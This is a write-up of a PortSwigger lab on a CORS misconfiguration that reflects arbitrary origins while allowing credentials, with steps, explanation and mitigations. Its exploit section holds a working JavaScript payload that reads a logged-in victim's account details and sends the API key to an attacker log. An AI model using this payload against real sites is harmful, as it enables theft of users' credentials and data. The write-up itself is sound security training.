# PortSwigger Lab Writeup

## Lab: CORS Vulnerability with Basic Origin Reflection – Apprentice

---

## Lab Overview

This lab demonstrates a Cross-Origin Resource Sharing (CORS) vulnerability caused by insecure origin validation.

The application reflects the value of the `Origin` request header in the `Access-Control-Allow-Origin` response header while also allowing credentials. As a result, an attacker-controlled website can make authenticated cross-origin requests and read sensitive data belonging to the victim.

The objective is to retrieve the administrator's API key using a malicious website.

---

## Objective

- Identify insecure CORS configuration
- Confirm origin reflection
- Exploit CORS to retrieve the administrator's API key

---

## Tools Used

- Burp Suite
- Web Browser
- Exploit Server

---

## Exploitation Steps

1. Log in using the provided credentials:

```
Username: wiener
Password: peter
```

2. Visit the **My Account** page.

3. Observe in Burp Suite that the application requests:

```
GET /accountDetails
```

4. Send the request to Burp Repeater.

5. Add the following request header:

```
Origin: https://example.com
```

6. Send the request.

7. Observe the response headers:

```
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
```

The application reflects any supplied origin, indicating an insecure CORS policy.

8. Go to the Exploit Server and create the following payload (replace `YOUR-LAB-ID` with your lab URL):

```html
<script>
var req = new XMLHttpRequest();

req.onload = function() {
    location='/log?key=' + this.responseText;
};

req.open('GET', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();
</script>
```

9. Store the exploit.

10. Click **View Exploit** to verify that your own API key is captured.

11. Deliver the exploit to the victim.

12. Open **Access Log**, retrieve the administrator's API key, and submit it to solve the lab.

---

## Screenshots

### 1. Request to `/accountDetails`
![Request](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/cors_lab_1-2.png)

### 2. Reflected Origin Header
![Origin Reflection](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/cors_lab_1-3.png)

### 3. Exploit Server Payload
![Exploit](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/cors_lab_1-4.png)

### 4. Administrator API Key Captured
![](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/cors_lab_1-5.png)
![](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/cors_lab_1-6.png)

---

## Result

- The server trusted an attacker-controlled origin.
- The browser included the victim's session cookies.
- The attacker was able to read the authenticated response.
- The administrator's API key was successfully retrieved.

---

## Vulnerability Explanation

This vulnerability occurs because of an insecure CORS configuration.

### 1. Origin Reflection

The server reflects any value supplied in the `Origin` header instead of validating trusted origins.

### 2. Credentials Allowed

The response includes:

```
Access-Control-Allow-Credentials: true
```

This instructs the browser to include the victim's cookies in cross-origin requests.

### 3. Sensitive Data Exposure

Since the attacker-controlled origin is trusted, JavaScript running on the attacker's website can read sensitive responses.

---

## Why the Attack Works

| Component | Effect |
|----------|--------|
| `Origin` header | Controlled by attacker |
| Reflected origin | Browser trusts malicious website |
| `Access-Control-Allow-Credentials: true` | Session cookies included |
| JavaScript (XMLHttpRequest) | Reads authenticated response |
| Exploit Server | Captures stolen API key |

---

## Mitigation Techniques

### 1. Use a Whitelist of Trusted Origins

Only allow explicitly trusted domains.

Example:

```
Access-Control-Allow-Origin: https://example.com
```

Do not dynamically reflect user-supplied origins.

---

### 2. Avoid Wildcards with Credentials

Never combine:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

---

### 3. Validate the Origin Header

Verify that the `Origin` belongs to an approved domain before returning CORS headers.

---

### 4. Avoid Exposing Sensitive APIs via CORS

Sensitive endpoints such as profile information, API keys, and account settings should not be accessible from arbitrary origins.

---

### 5. Implement Defense in Depth

- Use CSRF protections where appropriate
- Apply proper authentication and authorization checks
- Return the minimum required data

---

## Key Takeaways

- Never reflect arbitrary origins in CORS responses.
- Allow credentials only for trusted origins.
- Sensitive APIs should not be accessible cross-origin.
- Misconfigured CORS can expose confidential user data without requiring XSS.

---

## Lab Status

Solved Successfully
